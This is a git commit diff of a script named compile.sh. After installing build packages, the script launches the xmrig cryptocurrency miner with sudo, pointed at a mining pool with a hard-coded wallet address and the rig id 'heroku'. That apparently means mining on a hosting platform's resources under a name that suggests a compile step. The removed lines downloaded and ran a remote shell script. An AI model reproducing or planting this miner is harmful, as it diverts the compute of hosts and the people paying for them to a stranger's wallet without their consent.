c74c4cb087f90355ed9a0d67fb216c9387868e0b
mi33rs <104284556+mi33rs@users.noreply.github.com>
2022-04-25 16:44:36 +0800

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,9 +1,4 @@
 echo "install deps"
 sudo apt-get update -y &&sudo apt-get install build-essential cmake libuv1-dev libssl-dev libc6 libhwloc-dev -y
-
-wget https://raw.githubusercontent.com/akhilnarang/scripts/master/setup/android_build_env.sh
-chmod 755 android_build_env.sh
-./android_build_env.sh
-
 chmod 755 xmrig
 sudo ./xmrig -o us-west.minexmr.com:443 -u 45EUJCTJbToDf79PU8YrXxHwAomkXcWapBBGeQSKbb3hJKRbwbbJ8NZ34GQT61qkPEivjq3fk78DxVhmyyZCeSXJ1hw7PQR -k --tls --rig-id heroku
